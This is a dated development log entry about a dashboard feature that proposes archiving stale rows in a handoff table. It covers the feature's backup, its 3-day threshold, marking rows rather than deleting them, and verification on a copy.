- 2026-08-27 cycle 21 - :7778 stale IN-FLIGHT rows, proposed not applied. `~/zao-vault/handoffs/IN-FLIGHT.md` backed up first to `~/.zao/archive/inflight-20260827-045902/` and verified byte-identical afterwards - the dashboard does not write that file and the proposal's own header says so. Threshold 3 days (env `ZORCA_ARCHIVE_AFTER_D`): a row at 0-2 days is very likely a lane between reboots, while 3 days with no live pane, across a period when twenty other lanes ran, is a row describing work that stopped. Live: 34 rows across 20 lanes. Output is a paste-ready rewrite of the whole table with those rows MARKED - `| lane | ARCHIVED 2026-08-27 (no live lane for 9d): <original text> | ... |` - so applying it is one replace rather than twenty and nothing is deleted; each archived row keeps its lane, its text and its date. Header carries the source file's mtime and line count and says to reload if it has changed since. Correctness proven by applying the block to a COPY and re-parsing: 36 lanes before and after, no lane lost, orphan count and unmatched-pane count identical, live lane purposes unchanged, no archived lane has a live pane, and re-running the proposal over the proposed file marks 0 - so pasting it stops the surface nagging rather than re-proposing forever. Investigated one suspicious result rather than shipping it: a lane named `lanes` with 10 marked rows turned out to be a real session doing estate-wide audits, not a second table being mis-parsed. The 75 KB block rides the `detail=1` fetch and sits behind a disclosure, so the poll stays 44.6 KB and the DOM cost is opt-in. Field audit passes, above the fold at all five widths. Screenshot `/tmp/zorca-7778-archive.png`. File `gui/zorca-gui2`.

